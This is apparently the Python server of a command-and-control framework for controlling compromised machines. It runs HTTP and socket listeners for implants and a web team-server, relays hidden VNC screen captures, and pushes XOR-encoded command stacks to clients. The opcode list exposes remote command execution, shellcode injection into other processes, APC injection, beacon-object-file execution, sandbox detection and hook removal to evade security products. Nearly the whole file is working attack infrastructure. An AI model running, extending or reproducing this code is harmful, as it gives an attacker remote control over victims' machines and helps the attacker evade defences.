import socket, time
import zlib, re, os, json, binascii
from time import gmtime, strftime
import base64, shlex, random, killthread, threading
from tools import *
from waitress import serve
from flask import request, Flask, make_response
app = Flask(__name__)
app2 = Flask(__name__)
from requests.structures import CaseInsensitiveDict
import requests, struct
from io import BytesIO

stacks = {}
outs = {}
living = {}
allout = ""
SOCKS_SECRET = "VERYSECRET1337"
HTTP_C2_PORT = 1234
SOCKS_PORT = 6968
TEAMSERV_PORT = 6942
VNC_PORT = 1235

opcodes = """
    PRINT, //1//print [text]
    MSGBOX, //2//msgbox [title] [content]
    POPINT, //0
    POPSTR, //0
    CONSUME, //0
    EXEC, //r1//exec [command]
    EXIT, //0
    SLEEP, //1//sleep [time, ms]
    LOCAL_SHC, //1//local_shc [shellcode]
    LOCAL_SHC_RWX, //1//local_shc_rwx [shellcode]
    SANDBOX, //r0//detects sandbox
    REMOTE_SHC_PNAME, //3//remote_shc_pname [processname] [shellcode] [use rwx]
    REMOTE_SHC_PID, //3//remote_shc_pid [pid] [shellcode] [use rwx]
    SHC_INJECT_APC, //3//shc_inject_apc [processname] [shellcode] [use rwx]
    BOF_EXECUTE, //1//bof_execute file([bof file])
    SWAP_C2, //?//swap_c2 [c2 method] ... [poll interval]
    UNHOOK, //0//auto remove hooks
    VNC //2//vnc [ip] [port]
"""
c2s = """
    SOCKS,
    HTTP
"""
std_base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
url_base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
def gettime():
    return strftime("%Y-%m-%d %H:%M:%S", gmtime())
def iphash(ip):
    return hex(binascii.crc32(socket.inet_aton(ip)))[-4:].upper()
vncs = {}
@app2.route("/firstimage.png" , methods=['GET'])
def firstimg():
    global vncs
    try:
        vid = request.args["id"]
        vncs[vid].sendall(b"\x67"*9)
        sz = int.from_bytes(vncs[vid].recv(4, socket.MSG_WAITALL), "little")
        vncs[vid].recv(8, socket.MSG_WAITALL)
        data = vncs[vid].recv(sz, socket.MSG_WAITALL)
        response = make_response(data)
        response.headers.set('Content-Type', 'image/png')    
        return response
    except:
        if vid in vncs:
            vncs[vid].close()
            del vncs[vid]
        return ""
@app2.route("/image.png" , methods=['GET'])
def getimg():
    global vncs
    try:
        vid = request.args["id"]
        vncs[vid].sendall(b"\x68"*9)
        sz = int.from_bytes(vncs[vid].recv(4, socket.MSG_WAITALL), "little")
        x = int.from_bytes(vncs[vid].recv(4, socket.MSG_WAITALL), "little")
        y = int.from_bytes(vncs[vid].recv(4, socket.MSG_WAITALL), "little")
        data = vncs[vid].recv(sz, socket.MSG_WAITALL)
        response = make_response(data)
        response.headers.set('Content-Type', 'image/png')
        response.headers.set('X', str(x))
        response.headers.set('Y', str(y))
        return response
    except:
        if vid in vncs:
            vncs[vid].close()
            del vncs[vid]
        return ""
@app2.route("/vnc/<port>" , methods=['GET'])
def openvnc(port):
    f=open("server/ui/vnc.html", "r")
    r=f.read().replace("{ID}", port)
    f.close()
    return r
@app2.route("/closevnc" , methods=['GET'])
def closevnc():
    vid = request.args["id"]
    if vid in vncs:
        vncs[vid].close()
        del vncs[vid]
        return "Connection closed successfully!"
    return "Connection not closed"

def vncth():
    global vncs, VNC_PORT
    HOST = "0.0.0.0"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, VNC_PORT))
    s.listen()
    while True:
        conn, addr = s.accept()
        vncs[str(addr[1])] = conn

@app.route("/document/<uid>" , methods=['GET'])
def command(uid):
    global stacks, allout, outs
    uid += "-"+iphash(request.remote_addr)
    if "data" in request.args:
        if not uid in outs:
            outs[uid] = ""
        datum = xor(base64.b64decode(request.args["data"].translate(str.maketrans(url_base64chars, std_base64chars)).encode("ascii")+b"==")).decode("charmap")
        outs[uid] += datum
        allout += datum.replace("\n", "\n"+gettime()+" ["+uid+"]: ")
    elif "iv" in request.args:
        living[uid] = ["HTTP", time.time(), int(request.args["iv"])/1000]
        if uid in stacks:
            x = b"BEGIN\n"+base64.b64encode(stacks[uid])
            del stacks[uid]
            return x
    return "none"
def livers():
    global living, allout
    ol = []
    while True:
        nl = list(living.keys()).copy()
        for x in nl:
            if not x in ol:
                allout += "\n"+gettime()+" ["+x+"] connected!"
        for x in ol:
            if not x in nl:
                allout += "\n"+gettime()+" ["+x+"] died!"
        ol = nl
        for x in living.copy():
            if len(living[x]) == 3:
                if (time.time()-living[x][1]) > (living[x][2]*2)+1:
                    del living[x]
        time.sleep(0.1)


data = toCmdTable(opcodes)
c2table = toTable(c2s)
def socksender(conn, ref, uid):
    global stacks
    while ref[0]:
        if uid in stacks:
            conn.sendall(stacks[uid][4:])
            del stacks[uid]
        time.sleep(0.1)
        
def sockhand(conn, addr):
    global outs, allout, living
    fl = conn.makefile("rb")
    fl.readline()
    if fl.readline().decode("charmap").strip("\n") != SOCKS_SECRET:
        conn.close()
        return
    uid = fl.readline().decode("charmap").strip("\n")
    uid += "-"+iphash(addr[0])
    living[uid] = ["SOCKS"]
    if not uid in outs:
        outs[uid] = ""
    ref = [True]
    threading.Thread(target=socksender, args=(conn, ref, uid, )).start()
    try:
        d = conn.recv(1000)
    except:
        pass
    else:
        while d!=b"":
            datum = xor(d).decode("charmap")
            outs[uid]+=datum
            allout += datum.replace("\n", "\n"+gettime()+" ["+uid+"]: ")
            try:
                d = conn.recv(1000)
            except:
                break
    ref[0] = False
    conn.close()
    del living[uid]

def sockserv():
    HOST = "0.0.0.0"
    PORT = SOCKS_PORT
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    while True:
        conn, addr = s.accept()
        threading.Thread(target=sockhand, args=(conn, addr, )).start()
    s.close()


def httpserv():
    serve(app, host="0.0.0.0", port=HTTP_C2_PORT)
    
@app2.route("/recv" , methods=['GET'])
def allo():
    return allout.strip()+"\n"
@app2.route("/clients" , methods=['GET'])
def alive():
    global living, vncs
    a = []
    for x in living:
        a.append(x+" ("+living[x][0]+")")
    for x in vncs:
        a.append('<a target="_blank" href="/vnc/'+x+'">VNC '+x+'</a>')
    return json.dumps(a)
@app2.route("/" , methods=['GET'])
def index():
    f=open("server/ui/index.html", "r")
    r = f.read()
    f.close()
    return r

@app2.route("/opcodes" , methods=['GET'])
def lopcodes():
    global data
    a = []
    for x in data:
        s = x+" ("+str(data[x][2])+" args)"
        if data[x][1]:
            s+=" (returns string)"
        if len(data[x])>3:
            s+=" "+data[x][3]
        a.append(s)
    return json.dumps(a)

@app2.route("/sendcmd" , methods=['GET'])
def cmdsend():
    global data, stacks, living, c2table
    if not ("data" in request.args and "target" in request.args):   
        return "error: invalid request\n"
    
    stack = scriptparse(request.args["data"], data, c2table)
    if stack[1]!="":
        return "ERRORS<br>"+stack[1].replace("\n", "<br>")
    if request.args["target"] == "all":
        for x in list(living.keys()):
            stacks[x] = pack(random.randint(1, 2**32-1))+xor(construct(stack[0]))
    elif not request.args["target"] in list(living.keys()):
        return "error: client not online\n"
    else:
        stacks[request.args["target"]] = pack(random.randint(1, 2**32-1))+xor(construct(stack[0]))
    return "ok\n"
threading.Thread(target=livers).start()
killthread.Thread(target=sockserv).start()
killthread.Thread(target=httpserv).start()
killthread.Thread(target=vncth).start()
serve(app2, host="127.0.0.1", port=TEAMSERV_PORT)